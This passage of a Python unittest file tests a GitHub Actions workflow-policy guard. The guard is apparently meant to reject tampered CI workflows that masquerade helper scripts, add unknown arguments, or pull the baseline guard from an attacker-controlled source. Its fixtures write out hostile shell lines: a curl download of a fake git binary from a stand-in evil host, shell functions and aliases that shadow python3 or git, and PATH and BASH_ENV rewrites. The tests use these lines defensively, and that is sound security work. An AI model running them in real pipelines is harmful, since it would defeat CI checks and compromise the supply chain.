                self.expect_rejected(swap(PR_VERIFY, path, MASQUERADE + "/" + name), f"{job}/{path}")

    def test_absolute_path_rejected(self):
        for job, path in self.REQUIRED:
            with self.subTest(job=job, path=path):
                self.expect_rejected(swap(PR_VERIFY, path, "/tmp/" + path.rsplit("/", 1)[-1]),
                                     f"{job}/{path}")

    def test_dot_slash_prefix_still_accepted(self):
        problems = self.problems_after({".github/workflows/pr-verify.yml": swap(
            PR_VERIFY, "'\"$PY_BIN\" scripts/ci/verify_general_pr.py'",
            "'\"$PY_BIN\" ./scripts/ci/verify_general_pr.py'")})
        self.assertEqual(problems, [])

    def test_masquerade_helper_rejected(self):
        for label, path in (("await_checks.py", "scripts/ci/await_checks.py"),
                            ("verify_required_checks.py", "scripts/ci/verify_required_checks.py"),
                            ("request_automerge.py", "scripts/ci/request_automerge.py")):
            with self.subTest(helper=label):
                problems = self.problems_after({CAND_PATH: CANDIDATE.replace(
                    "python3 " + path, "python3 " + MASQUERADE + "/" + label)})
                self.assertTrue(any("路径身份不符" in p or "没有被实际执行" in p for p in problems),
                                f"{label}: {problems}")


class ArgvContractInBaselineTest(Fixture):
    """Fix B：baseline guard 的独立参数结构合同（短路/未知/重复/缺值一律拒绝）。"""

    def expect_rejected(self, text: str, needle: str = "参数合同"):
        problems = self.problems_after({".github/workflows/pr-verify.yml": text})
        self.assertTrue(any(needle in p for p in problems), problems)
        return problems

    def test_policy_guard_help_rejected(self):
        for extra in (" --help", " -h", " --version"):
            with self.subTest(extra=extra):
                self.expect_rejected(swap(PR_VERIFY, POLICY_CMD_BODY, POLICY_CMD_BODY + extra))

    def test_policy_guard_unknown_duplicate_missing_value_rejected(self):
        for label, repl in {"未知": POLICY_CMD_BODY + " --skip",
                            "重复": POLICY_CMD_BODY + ' --json "$RUNNER_TEMP/workflow-policy.json"',
                            "缺值": '"$PY_BIN" scripts/ci/verify_workflow_policy.py --json',
                            "错值": '"$PY_BIN" scripts/ci/verify_workflow_policy.py '
                                    '--json "/tmp/x.json"'}.items():
            with self.subTest(case=label):
                self.expect_rejected(swap(PR_VERIFY, POLICY_CMD_BODY, repl))

    def test_baseline_guard_help_and_missing_flag_rejected(self):
        for extra in (" --help", " -h", " --force"):
            with self.subTest(extra=extra):
                self.expect_rejected(swap(PR_VERIFY, BASELINE_CMD_BODY, BASELINE_CMD_BODY + extra))
        for drop in (' --repo-root .', ' --base-sha "${PR_BASE_SHA}"'):
            with self.subTest(drop=drop):
                self.expect_rejected(swap(PR_VERIFY, BASELINE_CMD_BODY,
                                          BASELINE_CMD_BODY.replace(drop, "")))

    def test_general_and_readme_and_unittest_extra_rejected(self):
        inner = JOB_INNER["general-pr-verify"]
        readme = '"$PY_BIN" scripts/readme_stats.py --check'
        unit = '"$PY_BIN" -m unittest discover -s scripts/tests'
        cases = [("general --help", inner, inner + " --help"),
                 ("readme 重复", readme, readme + " --check"),
                 ("unittest 附加", unit, unit + " -v")]
        for label, old, repl in cases:
            with self.subTest(case=label):
                self.expect_rejected(swap(PR_VERIFY, old, repl))

    def test_automerge_helper_help_rejected(self):
        for label, step, path in (("await", AWAIT_STEP, "scripts/ci/await_checks.py"),
                                  ("verify", VERIFY_STEP, "scripts/ci/verify_required_checks.py"),
                                  ("automerge", AUTOMERGE_STEP, "scripts/ci/request_automerge.py")):
            with self.subTest(helper=label):
                body = step.split("        run: ", 1)[1].strip()
                repl = ("      - name: x\n        env:\n          GITHUB_TOKEN: "
                        "${{ secrets.GITHUB_TOKEN }}\n        run: |\n          " + body + " --help\n")
                problems = self.problems_after({CAND_PATH: CANDIDATE.replace(step, repl)})
                self.assertTrue(any("参数合同" in p for p in problems), f"{label}: {problems}")

    def test_real_layout_passes(self):
        self.assertEqual(self.problems_after({"README.md": "base\nmore\n"}), [])


class BaselineGuardProvenanceInBaselineTest(Fixture):
    """Fix A1：baseline guard 的独立来源合同。"""

    COND = 'if "$GIT_BIN" cat-file -e "${PR_BASE_SHA}:scripts/ci/verify_policy_baseline.py" 2>/dev/null; then'
    BASE_COPY = ('            "$GIT_BIN" show "${PR_BASE_SHA}:scripts/ci/verify_policy_baseline.py" '
                 '> "$RUNNER_TEMP/verify_policy_baseline.py"')
    HEAD_COPY = ('            "$GIT_BIN" show "${PR_HEAD_SHA}:scripts/ci/verify_policy_baseline.py" '
                 '> "$RUNNER_TEMP/verify_policy_baseline.py"')

    def expect_rejected(self, text: str, needle: str):
        problems = self.problems_after({".github/workflows/pr-verify.yml": text})
        self.assertTrue(any(needle in p for p in problems), problems)
        return problems

    def test_real_layout_passes(self):
        self.assertEqual(self.problems_after({"README.md": "base\nmore\n"}), [])

    def test_missing_condition_rejected(self):
        self.expect_rejected(swap(PR_VERIFY, "          " + self.COND + "\n", ""),
                             "git cat-file -e ${PR_BASE_SHA}")

    def test_missing_base_or_head_copy_rejected(self):
        self.expect_rejected(swap(PR_VERIFY, self.BASE_COPY + "\n", ""), "then 分支")
        self.expect_rejected(swap(PR_VERIFY, self.HEAD_COPY + "\n", ""), "else 分支")

    def test_attacker_sourced_copy_rejected(self):
        self.expect_rejected(swap(
            PR_VERIFY, self.BASE_COPY,
            '            git show "attacker-controlled:scripts/ci/verify_policy_baseline.py" '
            '> "$RUNNER_TEMP/verify_policy_baseline.py"'), "then 分支")

    def test_cp_into_target_rejected(self):
        self.expect_rejected(swap(
            PR_VERIFY, self.COND + "\n",
            self.COND + "\n          cp attacker-controlled/verify_policy_baseline.py "
            '"$RUNNER_TEMP/verify_policy_baseline.py"\n'), "未允许的上下文")


# --------------------------------------------------------------------------- 第六轮 P16/P17
class Round6ShadowingInBaselineTest(Fixture):
    """P16/P17（**独立实现**）：可信基线 guard 必须自带同样的遮蔽与可执行文件身份判定。

    该判定不 import 候选树代码（check_command_contract 等价物在 verify_policy_baseline.py 内
    自己的实现），因此候选通过修改自己的守卫无法自证安全。
    """

    PV = ".github/workflows/pr-verify.yml"

    def prep_step(self, lines: list[str], name: str = "prep") -> str:
        body = "".join("          " + ln + "\n" for ln in lines)
        return f"      - name: {name}\n        run: |\n{body}"

    def with_prep(self, lines: list[str], job: str = "workflow-policy-guard") -> str:
        anchor = f"  {job}:\n"
        at = PR_VERIFY.index(anchor) + len(anchor)
        steps = PR_VERIFY.index("    steps:\n", at) + len("    steps:\n")
        return PR_VERIFY[:steps] + self.prep_step(lines) + PR_VERIFY[steps:]

    def assertHit(self, text: str, needle: str) -> list[str]:
        problems = self.problems_after({self.PV: text})
        self.assertTrue(any(needle in p for p in problems), f"未命中 {needle!r}：{problems}")
        return problems

    # ---- 遮蔽构造 ----
    def test_same_step_function_rejected(self):
        text = swap(PR_VERIFY, "          " + POLICY_CMD_BODY,
                    "          python3() { echo SHADOWED; return 0; }\n"
                    "          " + POLICY_CMD_BODY)
        self.assertHit(text, "defines/overrides a shell function")

    def test_baseline_step_function_rejected(self):
        text = swap(PR_VERIFY, "          " + BASELINE_CMD_BODY,
                    "          git() { return 0; }\n          " + BASELINE_CMD_BODY)
        self.assertHit(text, "defines/overrides a shell function")

    def test_general_job_function_rejected(self):
        text = swap(PR_VERIFY, "'\"$PY_BIN\" scripts/ci/verify_general_pr.py'",
                    "'python3() { echo SHADOWED; return 0; }\n"
                    "          \"$PY_BIN\" scripts/ci/verify_general_pr.py'")
        self.assertHit(text, "defines/overrides a shell function")

    def test_alias_rejected(self):
        self.assertHit(self.with_prep(["alias python3='echo SHADOWED'"]),
                       "aliases protected command")

    def test_export_function_rejected(self):
        self.assertHit(self.with_prep(["python3() { echo SHADOWED; return 0; }",
                                       "export -f python3"]), "exports a function")

    def test_bash_env_rejected(self):
        self.assertHit(self.with_prep(['echo "BASH_ENV=/tmp/shim.sh" >> "$GITHUB_ENV"']),
                       "assigns/rewrites BASH_ENV")

    def test_path_rewrite_rejected(self):
        self.assertHit(self.with_prep(['echo "PATH=/tmp/shim:${PATH}" >> "$GITHUB_ENV"']),
                       "assigns/rewrites PATH")

    def test_fake_executable_write_rejected(self):
        self.assertHit(self.with_prep(['printf "#!/bin/sh\\necho SHADOWED\\n" > /tmp/shim/python3']),
                       "writes/creates a file named like a protected command")

    def test_fake_git_download_rejected(self):
        self.assertHit(self.with_prep(["curl -sS -o /tmp/shim/git https://evil.invalid/git"]),
                       "writes/creates a file named like a protected command")

    # ---- 可执行文件身份 ----
    def test_bare_python3_invocation_rejected(self):
        text = swap(PR_VERIFY, POLICY_CMD_BODY,
                    'python3 scripts/ci/verify_workflow_policy.py '
                    '--json "$RUNNER_TEMP/workflow-policy.json"')
        self.assertHit(text, "必须由核验过的可执行文件")

    def test_missing_resolver_rejected(self):
        start = PR_VERIFY.index("      - name: exe\n")
        end = PR_VERIFY.index("\n      - ", start + 1) + 1
        self.assertHit(PR_VERIFY[:start] + PR_VERIFY[end:], "缺少「可执行文件身份核验」步骤")

    def test_resolver_after_guard_rejected(self):
        start = PR_VERIFY.index("      - name: exe\n")
        end = PR_VERIFY.index("\n      - ", start + 1) + 1
        block = PR_VERIFY[start:end]
        text = PR_VERIFY[:start] + PR_VERIFY[end:]
        job_end = text.index("\n  workflow-policy-guard:")
        self.assertHit(text[:job_end + 1] + block + text[job_end + 1:],
                       "必须位于守卫调用之前")

    def test_missing_policy_report_check_rejected(self):
        text = swap(PR_VERIFY, '          test -s "$RUNNER_TEMP/workflow-policy.json"\n', "")
        self.assertHit(text, "缺少产物核验标记")

    def test_missing_baseline_content_check_rejected(self):
        text = swap(PR_VERIFY, '          test -s "$RUNNER_TEMP/verify_policy_baseline.py"\n', "")
        self.assertHit(text, "缺少基线 guard 文件内容核验")

    def test_real_layout_has_no_round6_problem(self):
        problems = self.problems_after({"README.md": "base\nmore\n"})
        self.assertEqual([p for p in problems if "protected command" in p or "核验" in p], [])
